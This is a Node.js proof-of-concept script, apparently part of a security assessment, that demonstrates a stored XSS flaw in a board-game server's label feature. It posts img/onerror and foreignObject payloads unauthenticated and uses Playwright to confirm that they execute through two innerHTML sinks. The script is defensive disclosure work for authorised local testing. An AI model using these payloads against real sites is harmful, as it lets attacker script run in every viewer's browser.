// Stored XSS via a board label (SECURITY_ASSESSMENT.md — XSS-1).
//
// An unauthenticated client sets a board label (the `label` event, or an uploaded
// SGF `LB` field) whose text is a markup payload. The label is broadcast to and
// persisted for every room participant, and the frontend renders it with
//   text.innerHTML = txt        (boardgraphics.js:516, svg_draw_centered_text)
// on an SVG <text> element — which executes injected event handlers. Result:
// arbitrary JS in every viewer's browser, in the origin the board is embedded in.
//
// Usage (authorised local testing only):
//   go build -o /tmp/board ./cmd && /tmp/board -f config/config-memory.yaml   # :8080
//   node security/poc/browser/xss_label.js [http://localhost:8080]
//
// Requires Playwright + a Chromium (this repo's CI image ships both:
//   PLAYWRIGHT_BROWSERS_PATH=/opt/pw-browsers, playwright under /opt/node22).
//
// NOTE: the real board loads Bootstrap from a CDN. Where that CDN is reachable
// (i.e. a normal user's browser) no stub is needed and the XSS fires in the real
// app. This PoC injects a tiny window.bootstrap stub so it also runs in a
// CDN-blocked sandbox; it does not affect the vulnerability.

const path = require('path');
function loadPlaywright() {
  for (const p of ['playwright', '/opt/node22/lib/node_modules/playwright']) {
    try { return require(p); } catch (e) {}
  }
  console.error('playwright not found; `npm i -g playwright` or set NODE_PATH'); process.exit(2);
}
const { chromium } = loadPlaywright();
const http = require('http');
const base = process.argv[2] || 'http://localhost:8080';
const u = new URL(base);

function post(p, body) {
  return new Promise((res, rej) => {
    const d = Buffer.from(body);
    const r = http.request({ host: u.hostname, port: u.port, path: p, method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': d.length } },
      x => { let b = ''; x.on('data', c => b += c); x.on('end', () => res(b)); });
    r.on('error', rej); r.write(d); r.end();
  });
}

const BOOT = `window.bootstrap={Modal:class{show(){}hide(){}static getOrCreateInstance(){return new this();}},Toast:class{show(){}hide(){}static getOrCreateInstance(){return new this();}},Collapse:class{show(){}hide(){}toggle(){}static getOrCreateInstance(){return new this();}},Tooltip:class{dispose(){}},Dropdown:class{}};`;

async function run(label, flag, coords) {
  const room = 'poc-xss-' + Date.now() + '-' + Math.floor(Math.random() * 1e6);
  // ATTACKER (unauthenticated): inject the malicious label into the room.
  await post('/api/v1/room/' + room, JSON.stringify({ event: 'label', value: { coords, label } }));
  const browser = await chromium.launch();
  const page = await browser.newPage();
  await page.addInitScript(BOOT);
  await page.route('**/cdn.jsdelivr.net/**', r => r.fulfill({ status: 200, contentType: 'text/css', body: '' }));
  await page.goto(base + '/b/' + room, { waitUntil: 'domcontentloaded' }); // VICTIM opens the board
  await page.waitForTimeout(3000);
  const xss = await page.evaluate(f => window[f] || null, flag);
  await browser.close();
  return xss;
}

(async () => {
  // 1a: string-branch sink (boardgraphics.js:516)
  const a = await run('<img src=x onerror="window.__a=document.domain">', '__a', [3, 3]);
  console.log('[' + (a ? '+' : '-') + '] XSS-1a (label sink :516):', a ? 'CONFIRMED (' + a + ')' : 'not fired');
  // 1b: numeric-prefix-branch sink (boardgraphics.js:540) — a fix limited to :516 misses this
  const b = await run('1<foreignObject><img src=x onerror="window.__b=document.domain"></foreignObject>', '__b', [9, 9]);
  console.log('[' + (b ? '+' : '-') + '] XSS-1b (digit-prefixed label, sink :540):', b ? 'CONFIRMED (' + b + ')' : 'not fired');
  process.exit(a || b ? 0 : 1);
})().catch(e => { console.error('ERR', e.message); process.exit(1); });
